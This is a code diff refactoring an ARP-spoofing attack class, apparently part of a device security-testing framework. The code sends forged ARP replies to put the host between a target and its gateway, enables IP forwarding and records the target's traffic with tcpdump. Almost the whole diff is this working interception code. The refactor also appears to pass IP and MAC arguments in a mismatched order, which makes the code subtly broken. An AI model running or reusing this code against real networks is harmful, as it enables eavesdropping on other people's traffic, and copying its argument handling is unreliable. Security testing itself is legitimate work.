@@ -21,7 +21,7 @@ class ArpSpoof(GenericAttack):
         self.respoofer(self.device["ip"], self.device["gateway-ip"])
         return
 
-    def respoofer(self, targetIP, victim):
+    def respoofer(self, targetIp, gatewayIp):
         """ Respoof the target every two seconds.
         """
         file_prefix = "arp";
@@ -29,22 +29,25 @@ class ArpSpoof(GenericAttack):
             file_prefix = self.config["file_prefix"]
 
         filename = 'results/' + self.device['time'] + '/' + file_prefix + self.device['macAddress'] + '.pcap'
+
         self.enable_packet_forwarding()
         if self.config['tcpdump']:
             global proc
-            proc = subprocess.Popen(['tcpdump', 'host', targetIP, '-w',
+            proc = subprocess.Popen(['tcpdump', 'host', targetIp, '-w',
                                   filename], stdout=subprocess.PIPE)
         try:
+            targetMac = ioutil.NetworkUtil.getMacbyIp(targetIp)
+            gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIp)
             while self.running:
-                self.arpspoof(targetIP, victim)
-                time.sleep(1)
-            self.restoreARP(targetIP, victim)
+                self.arpspoof(targetIp, gatewayIp, gatewayMAC, targetMac)
+                time.sleep(2)
+            self.restoreARP(targetIp, gatewayIp)
             self.disable_packet_forwarding()
             self.terminateDump()
         except Exception, j:
             self.terminateDump()
             self.disable_packet_forwarding()
-            self.restoreARP(targetIP, victim)
+            self.restoreARP(targetIp, gatewayIp)
 
 
 
@@ -54,6 +57,7 @@ class ArpSpoof(GenericAttack):
             os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
             os.system('sudo sysctl -w net.inet.ip.fw.enable=1 > /dev/null ')
         else:
+            log.info("enabled ip forwarding")
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
     # disables packet forwarding by interacting with the proc filesystem
@@ -64,11 +68,9 @@ class ArpSpoof(GenericAttack):
         else:
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
-    def arpspoof(self, gatewayIP, victimIP):
-        victimMAC = ioutil.NetworkUtil.getMacbyIp(victimIP)
-        gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIP)
-        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMAC))
-        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMAC))
+    def arpspoof(self, gatewayIP, victimIP, gatewayMac, victimMac):
+        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMac))
+        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMac))
 
     def restoreARP(self, gatewayIP, victimIP):
         victimMAC = ioutil.NetworkUtil.getMacbyIp(victimIP)
